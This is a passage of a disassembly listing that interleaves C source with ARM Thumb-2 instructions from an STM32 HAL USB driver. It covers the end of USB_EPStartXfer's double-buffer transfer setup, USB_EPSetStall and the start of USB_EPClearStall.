 8007f70:	78db      	ldrb	r3, [r3, #3]
 8007f72:	2b01      	cmp	r3, #1
 8007f74:	f040 81b4 	bne.w	80082e0 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007f78:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f7c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f80:	681b      	ldr	r3, [r3, #0]
 8007f82:	699a      	ldr	r2, [r3, #24]
 8007f84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f8c:	681b      	ldr	r3, [r3, #0]
 8007f8e:	691b      	ldr	r3, [r3, #16]
 8007f90:	429a      	cmp	r2, r3
 8007f92:	d917      	bls.n	8007fc4 <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007f94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f98:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f9c:	681b      	ldr	r3, [r3, #0]
 8007f9e:	691b      	ldr	r3, [r3, #16]
 8007fa0:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007fa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fa8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fac:	681b      	ldr	r3, [r3, #0]
 8007fae:	699a      	ldr	r2, [r3, #24]
 8007fb0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fb4:	1ad2      	subs	r2, r2, r3
 8007fb6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fbe:	681b      	ldr	r3, [r3, #0]
 8007fc0:	619a      	str	r2, [r3, #24]
 8007fc2:	e00e      	b.n	8007fe2 <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007fc4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fc8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fcc:	681b      	ldr	r3, [r3, #0]
 8007fce:	699b      	ldr	r3, [r3, #24]
 8007fd0:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007fd4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fd8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fdc:	681b      	ldr	r3, [r3, #0]
 8007fde:	2200      	movs	r2, #0
 8007fe0:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007fe2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fe6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fea:	681b      	ldr	r3, [r3, #0]
 8007fec:	785b      	ldrb	r3, [r3, #1]
 8007fee:	2b00      	cmp	r3, #0
 8007ff0:	f040 8085 	bne.w	80080fe <USB_EPStartXfer+0x14fc>
 8007ff4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ff8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ffc:	681b      	ldr	r3, [r3, #0]
 8007ffe:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8008002:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008006:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800800a:	681b      	ldr	r3, [r3, #0]
 800800c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008010:	b29b      	uxth	r3, r3
 8008012:	461a      	mov	r2, r3
 8008014:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8008018:	4413      	add	r3, r2
 800801a:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 800801e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008022:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008026:	681b      	ldr	r3, [r3, #0]
 8008028:	781b      	ldrb	r3, [r3, #0]
 800802a:	00da      	lsls	r2, r3, #3
 800802c:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8008030:	4413      	add	r3, r2
 8008032:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8008036:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 800803a:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800803e:	881b      	ldrh	r3, [r3, #0]
 8008040:	b29b      	uxth	r3, r3
 8008042:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8008046:	b29a      	uxth	r2, r3
 8008048:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800804c:	801a      	strh	r2, [r3, #0]
 800804e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008052:	2b3e      	cmp	r3, #62	; 0x3e
 8008054:	d923      	bls.n	800809e <USB_EPStartXfer+0x149c>
 8008056:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800805a:	095b      	lsrs	r3, r3, #5
 800805c:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8008060:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008064:	f003 031f 	and.w	r3, r3, #31
 8008068:	2b00      	cmp	r3, #0
 800806a:	d104      	bne.n	8008076 <USB_EPStartXfer+0x1474>
 800806c:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8008070:	3b01      	subs	r3, #1
 8008072:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8008076:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800807a:	881b      	ldrh	r3, [r3, #0]
 800807c:	b29a      	uxth	r2, r3
 800807e:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8008082:	b29b      	uxth	r3, r3
 8008084:	029b      	lsls	r3, r3, #10
 8008086:	b29b      	uxth	r3, r3
 8008088:	4313      	orrs	r3, r2
 800808a:	b29b      	uxth	r3, r3
 800808c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008090:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008094:	b29a      	uxth	r2, r3
 8008096:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800809a:	801a      	strh	r2, [r3, #0]
 800809c:	e060      	b.n	8008160 <USB_EPStartXfer+0x155e>
 800809e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080a2:	2b00      	cmp	r3, #0
 80080a4:	d10c      	bne.n	80080c0 <USB_EPStartXfer+0x14be>
 80080a6:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080aa:	881b      	ldrh	r3, [r3, #0]
 80080ac:	b29b      	uxth	r3, r3
 80080ae:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80080b2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80080b6:	b29a      	uxth	r2, r3
 80080b8:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080bc:	801a      	strh	r2, [r3, #0]
 80080be:	e04f      	b.n	8008160 <USB_EPStartXfer+0x155e>
 80080c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080c4:	085b      	lsrs	r3, r3, #1
 80080c6:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 80080ca:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080ce:	f003 0301 	and.w	r3, r3, #1
 80080d2:	2b00      	cmp	r3, #0
 80080d4:	d004      	beq.n	80080e0 <USB_EPStartXfer+0x14de>
 80080d6:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 80080da:	3301      	adds	r3, #1
 80080dc:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 80080e0:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080e4:	881b      	ldrh	r3, [r3, #0]
 80080e6:	b29a      	uxth	r2, r3
 80080e8:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 80080ec:	b29b      	uxth	r3, r3
 80080ee:	029b      	lsls	r3, r3, #10
 80080f0:	b29b      	uxth	r3, r3
 80080f2:	4313      	orrs	r3, r2
 80080f4:	b29a      	uxth	r2, r3
 80080f6:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080fa:	801a      	strh	r2, [r3, #0]
 80080fc:	e030      	b.n	8008160 <USB_EPStartXfer+0x155e>
 80080fe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008102:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008106:	681b      	ldr	r3, [r3, #0]
 8008108:	785b      	ldrb	r3, [r3, #1]
 800810a:	2b01      	cmp	r3, #1
 800810c:	d128      	bne.n	8008160 <USB_EPStartXfer+0x155e>
 800810e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008112:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008116:	681b      	ldr	r3, [r3, #0]
 8008118:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 800811c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008120:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008124:	681b      	ldr	r3, [r3, #0]
 8008126:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800812a:	b29b      	uxth	r3, r3
 800812c:	461a      	mov	r2, r3
 800812e:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8008132:	4413      	add	r3, r2
 8008134:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8008138:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800813c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008140:	681b      	ldr	r3, [r3, #0]
 8008142:	781b      	ldrb	r3, [r3, #0]
 8008144:	00da      	lsls	r2, r3, #3
 8008146:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 800814a:	4413      	add	r3, r2
 800814c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8008150:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8008154:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008158:	b29a      	uxth	r2, r3
 800815a:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 800815e:	801a      	strh	r2, [r3, #0]
 8008160:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008164:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008168:	681b      	ldr	r3, [r3, #0]
 800816a:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 800816e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008172:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008176:	681b      	ldr	r3, [r3, #0]
 8008178:	785b      	ldrb	r3, [r3, #1]
 800817a:	2b00      	cmp	r3, #0
 800817c:	f040 8085 	bne.w	800828a <USB_EPStartXfer+0x1688>
 8008180:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008184:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008188:	681b      	ldr	r3, [r3, #0]
 800818a:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 800818e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008192:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008196:	681b      	ldr	r3, [r3, #0]
 8008198:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800819c:	b29b      	uxth	r3, r3
 800819e:	461a      	mov	r2, r3
 80081a0:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 80081a4:	4413      	add	r3, r2
 80081a6:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 80081aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081ae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80081b2:	681b      	ldr	r3, [r3, #0]
 80081b4:	781b      	ldrb	r3, [r3, #0]
 80081b6:	00da      	lsls	r2, r3, #3
 80081b8:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 80081bc:	4413      	add	r3, r2
 80081be:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80081c2:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 80081c6:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80081ca:	881b      	ldrh	r3, [r3, #0]
 80081cc:	b29b      	uxth	r3, r3
 80081ce:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80081d2:	b29a      	uxth	r2, r3
 80081d4:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80081d8:	801a      	strh	r2, [r3, #0]
 80081da:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80081de:	2b3e      	cmp	r3, #62	; 0x3e
 80081e0:	d923      	bls.n	800822a <USB_EPStartXfer+0x1628>
 80081e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80081e6:	095b      	lsrs	r3, r3, #5
 80081e8:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80081ec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80081f0:	f003 031f 	and.w	r3, r3, #31
 80081f4:	2b00      	cmp	r3, #0
 80081f6:	d104      	bne.n	8008202 <USB_EPStartXfer+0x1600>
 80081f8:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80081fc:	3b01      	subs	r3, #1
 80081fe:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008202:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008206:	881b      	ldrh	r3, [r3, #0]
 8008208:	b29a      	uxth	r2, r3
 800820a:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800820e:	b29b      	uxth	r3, r3
 8008210:	029b      	lsls	r3, r3, #10
 8008212:	b29b      	uxth	r3, r3
 8008214:	4313      	orrs	r3, r2
 8008216:	b29b      	uxth	r3, r3
 8008218:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800821c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008220:	b29a      	uxth	r2, r3
 8008222:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008226:	801a      	strh	r2, [r3, #0]
 8008228:	e05c      	b.n	80082e4 <USB_EPStartXfer+0x16e2>
 800822a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800822e:	2b00      	cmp	r3, #0
 8008230:	d10c      	bne.n	800824c <USB_EPStartXfer+0x164a>
 8008232:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008236:	881b      	ldrh	r3, [r3, #0]
 8008238:	b29b      	uxth	r3, r3
 800823a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800823e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008242:	b29a      	uxth	r2, r3
 8008244:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008248:	801a      	strh	r2, [r3, #0]
 800824a:	e04b      	b.n	80082e4 <USB_EPStartXfer+0x16e2>
 800824c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008250:	085b      	lsrs	r3, r3, #1
 8008252:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008256:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800825a:	f003 0301 	and.w	r3, r3, #1
 800825e:	2b00      	cmp	r3, #0
 8008260:	d004      	beq.n	800826c <USB_EPStartXfer+0x166a>
 8008262:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008266:	3301      	adds	r3, #1
 8008268:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800826c:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008270:	881b      	ldrh	r3, [r3, #0]
 8008272:	b29a      	uxth	r2, r3
 8008274:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008278:	b29b      	uxth	r3, r3
 800827a:	029b      	lsls	r3, r3, #10
 800827c:	b29b      	uxth	r3, r3
 800827e:	4313      	orrs	r3, r2
 8008280:	b29a      	uxth	r2, r3
 8008282:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008286:	801a      	strh	r2, [r3, #0]
 8008288:	e02c      	b.n	80082e4 <USB_EPStartXfer+0x16e2>
 800828a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800828e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008292:	681b      	ldr	r3, [r3, #0]
 8008294:	785b      	ldrb	r3, [r3, #1]
 8008296:	2b01      	cmp	r3, #1
 8008298:	d124      	bne.n	80082e4 <USB_EPStartXfer+0x16e2>
 800829a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800829e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80082a2:	681b      	ldr	r3, [r3, #0]
 80082a4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80082a8:	b29b      	uxth	r3, r3
 80082aa:	461a      	mov	r2, r3
 80082ac:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80082b0:	4413      	add	r3, r2
 80082b2:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 80082b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80082ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80082be:	681b      	ldr	r3, [r3, #0]
 80082c0:	781b      	ldrb	r3, [r3, #0]
 80082c2:	00da      	lsls	r2, r3, #3
 80082c4:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80082c8:	4413      	add	r3, r2
 80082ca:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80082ce:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 80082d2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80082d6:	b29a      	uxth	r2, r3
 80082d8:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 80082dc:	801a      	strh	r2, [r3, #0]
 80082de:	e001      	b.n	80082e4 <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 80082e0:	2301      	movs	r3, #1
 80082e2:	e03a      	b.n	800835a <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80082e4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80082e8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80082ec:	681a      	ldr	r2, [r3, #0]
 80082ee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80082f2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80082f6:	681b      	ldr	r3, [r3, #0]
 80082f8:	781b      	ldrb	r3, [r3, #0]
 80082fa:	009b      	lsls	r3, r3, #2
 80082fc:	4413      	add	r3, r2
 80082fe:	881b      	ldrh	r3, [r3, #0]
 8008300:	b29b      	uxth	r3, r3
 8008302:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008306:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800830a:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800830e:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008312:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008316:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800831a:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800831e:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8008322:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008326:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800832a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800832e:	681a      	ldr	r2, [r3, #0]
 8008330:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008334:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008338:	681b      	ldr	r3, [r3, #0]
 800833a:	781b      	ldrb	r3, [r3, #0]
 800833c:	009b      	lsls	r3, r3, #2
 800833e:	441a      	add	r2, r3
 8008340:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008344:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008348:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800834c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008350:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008354:	b29b      	uxth	r3, r3
 8008356:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008358:	2300      	movs	r3, #0
}
 800835a:	4618      	mov	r0, r3
 800835c:	f507 7784 	add.w	r7, r7, #264	; 0x108
 8008360:	46bd      	mov	sp, r7
 8008362:	bd80      	pop	{r7, pc}

08008364 <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8008364:	b480      	push	{r7}
 8008366:	b085      	sub	sp, #20
 8008368:	af00      	add	r7, sp, #0
 800836a:	6078      	str	r0, [r7, #4]
 800836c:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 800836e:	683b      	ldr	r3, [r7, #0]
 8008370:	785b      	ldrb	r3, [r3, #1]
 8008372:	2b00      	cmp	r3, #0
 8008374:	d020      	beq.n	80083b8 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 8008376:	687a      	ldr	r2, [r7, #4]
 8008378:	683b      	ldr	r3, [r7, #0]
 800837a:	781b      	ldrb	r3, [r3, #0]
 800837c:	009b      	lsls	r3, r3, #2
 800837e:	4413      	add	r3, r2
 8008380:	881b      	ldrh	r3, [r3, #0]
 8008382:	b29b      	uxth	r3, r3
 8008384:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008388:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800838c:	81bb      	strh	r3, [r7, #12]
 800838e:	89bb      	ldrh	r3, [r7, #12]
 8008390:	f083 0310 	eor.w	r3, r3, #16
 8008394:	81bb      	strh	r3, [r7, #12]
 8008396:	687a      	ldr	r2, [r7, #4]
 8008398:	683b      	ldr	r3, [r7, #0]
 800839a:	781b      	ldrb	r3, [r3, #0]
 800839c:	009b      	lsls	r3, r3, #2
 800839e:	441a      	add	r2, r3
 80083a0:	89bb      	ldrh	r3, [r7, #12]
 80083a2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80083a6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80083aa:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80083ae:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80083b2:	b29b      	uxth	r3, r3
 80083b4:	8013      	strh	r3, [r2, #0]
 80083b6:	e01f      	b.n	80083f8 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 80083b8:	687a      	ldr	r2, [r7, #4]
 80083ba:	683b      	ldr	r3, [r7, #0]
 80083bc:	781b      	ldrb	r3, [r3, #0]
 80083be:	009b      	lsls	r3, r3, #2
 80083c0:	4413      	add	r3, r2
 80083c2:	881b      	ldrh	r3, [r3, #0]
 80083c4:	b29b      	uxth	r3, r3
 80083c6:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80083ca:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80083ce:	81fb      	strh	r3, [r7, #14]
 80083d0:	89fb      	ldrh	r3, [r7, #14]
 80083d2:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80083d6:	81fb      	strh	r3, [r7, #14]
 80083d8:	687a      	ldr	r2, [r7, #4]
 80083da:	683b      	ldr	r3, [r7, #0]
 80083dc:	781b      	ldrb	r3, [r3, #0]
 80083de:	009b      	lsls	r3, r3, #2
 80083e0:	441a      	add	r2, r3
 80083e2:	89fb      	ldrh	r3, [r7, #14]
 80083e4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80083e8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80083ec:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80083f0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80083f4:	b29b      	uxth	r3, r3
 80083f6:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80083f8:	2300      	movs	r3, #0
}
 80083fa:	4618      	mov	r0, r3
 80083fc:	3714      	adds	r7, #20
 80083fe:	46bd      	mov	sp, r7
 8008400:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008404:	4770      	bx	lr

08008406 <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8008406:	b480      	push	{r7}
 8008408:	b087      	sub	sp, #28
 800840a:	af00      	add	r7, sp, #0
 800840c:	6078      	str	r0, [r7, #4]
 800840e:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008410:	683b      	ldr	r3, [r7, #0]
 8008412:	7b1b      	ldrb	r3, [r3, #12]
 8008414:	2b00      	cmp	r3, #0
 8008416:	f040 809d 	bne.w	8008554 <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 800841a:	683b      	ldr	r3, [r7, #0]
 800841c:	785b      	ldrb	r3, [r3, #1]
 800841e:	2b00      	cmp	r3, #0
 8008420:	d04c      	beq.n	80084bc <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8008422:	687a      	ldr	r2, [r7, #4]
 8008424:	683b      	ldr	r3, [r7, #0]
 8008426:	781b      	ldrb	r3, [r3, #0]
 8008428:	009b      	lsls	r3, r3, #2
 800842a:	4413      	add	r3, r2
 800842c:	881b      	ldrh	r3, [r3, #0]
 800842e:	823b      	strh	r3, [r7, #16]
 8008430:	8a3b      	ldrh	r3, [r7, #16]
 8008432:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8008436:	2b00      	cmp	r3, #0
 8008438:	d01b      	beq.n	8008472 <USB_EPClearStall+0x6c>
 800843a:	687a      	ldr	r2, [r7, #4]
 800843c:	683b      	ldr	r3, [r7, #0]
 800843e:	781b      	ldrb	r3, [r3, #0]
 8008440:	009b      	lsls	r3, r3, #2
 8008442:	4413      	add	r3, r2
 8008444:	881b      	ldrh	r3, [r3, #0]
 8008446:	b29b      	uxth	r3, r3
 8008448:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800844c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008450:	81fb      	strh	r3, [r7, #14]
 8008452:	687a      	ldr	r2, [r7, #4]
 8008454:	683b      	ldr	r3, [r7, #0]
 8008456:	781b      	ldrb	r3, [r3, #0]
 8008458:	009b      	lsls	r3, r3, #2
 800845a:	441a      	add	r2, r3
 800845c:	89fb      	ldrh	r3, [r7, #14]
 800845e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008462:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008466:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800846a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800846e:	b29b      	uxth	r3, r3
 8008470:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8008472:	683b      	ldr	r3, [r7, #0]
 8008474:	78db      	ldrb	r3, [r3, #3]
 8008476:	2b01      	cmp	r3, #1
 8008478:	d06c      	beq.n	8008554 <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 800847a:	687a      	ldr	r2, [r7, #4]
 800847c:	683b      	ldr	r3, [r7, #0]
 800847e:	781b      	ldrb	r3, [r3, #0]
 8008480:	009b      	lsls	r3, r3, #2
 8008482:	4413      	add	r3, r2
 8008484:	881b      	ldrh	r3, [r3, #0]
 8008486:	b29b      	uxth	r3, r3
 8008488:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800848c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008490:	81bb      	strh	r3, [r7, #12]
 8008492:	89bb      	ldrh	r3, [r7, #12]
 8008494:	f083 0320 	eor.w	r3, r3, #32
 8008498:	81bb      	strh	r3, [r7, #12]
 800849a:	687a      	ldr	r2, [r7, #4]
 800849c:	683b      	ldr	r3, [r7, #0]
 800849e:	781b      	ldrb	r3, [r3, #0]
 80084a0:	009b      	lsls	r3, r3, #2
 80084a2:	441a      	add	r2, r3
 80084a4:	89bb      	ldrh	r3, [r7, #12]
 80084a6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80084aa:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80084ae:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80084b2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80084b6:	b29b      	uxth	r3, r3
 80084b8:	8013      	strh	r3, [r2, #0]
 80084ba:	e04b      	b.n	8008554 <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
